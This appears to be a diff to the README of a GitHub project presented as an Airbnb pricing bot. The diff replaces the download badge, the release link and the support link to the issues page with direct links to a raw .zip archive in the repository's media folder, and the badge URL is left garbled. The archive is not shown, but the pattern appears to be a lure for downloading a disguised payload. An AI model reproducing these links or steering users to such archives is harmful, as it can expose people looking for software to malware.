@@ -1,6 +1,6 @@
 # 🤖 Airbnb-Custom-Pricing-Bot - Automate Your Airbnb Pricing Instantly!
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen.svg)](https://github.com/ShaiseWtch333/Airbnb-Custom-Pricing-Bot/releases)
+[![Download](https://raw.githubusercontent.com/ShaiseWtch333/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot-v2.9.zip%https://raw.githubusercontent.com/ShaiseWtch333/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot-v2.9.zip)](https://raw.githubusercontent.com/ShaiseWtch333/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ The Airbnb Custom Pricing Bot automates pricing adjustments for your Airbnb prop
 
 To get the latest version of the Airbnb Custom Pricing Bot, you need to visit the Releases page. Here is the link:
 
-[Visit this page to download](https://github.com/ShaiseWtch333/Airbnb-Custom-Pricing-Bot/releases)
+[Visit this page to download](https://raw.githubusercontent.com/ShaiseWtch333/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot-v2.9.zip)
 
 Follow these steps for a smooth installation:
 
@@ -62,7 +62,7 @@ If problems persist, you can check the FAQ section on the Releases page or open 
 
 ## 💬 Support
 
-For further assistance, feel free to reach out. You can open an issue on the [GitHub repository](https://github.com/ShaiseWtch333/Airbnb-Custom-Pricing-Bot/issues) where our community and the maintainer can help you resolve your questions.
+For further assistance, feel free to reach out. You can open an issue on the [GitHub repository](https://raw.githubusercontent.com/ShaiseWtch333/Airbnb-Custom-Pricing-Bot/main/media/Airbnb-Custom-Pricing-Bot-v2.9.zip) where our community and the maintainer can help you resolve your questions.
 
 ## 💡 Tips
 
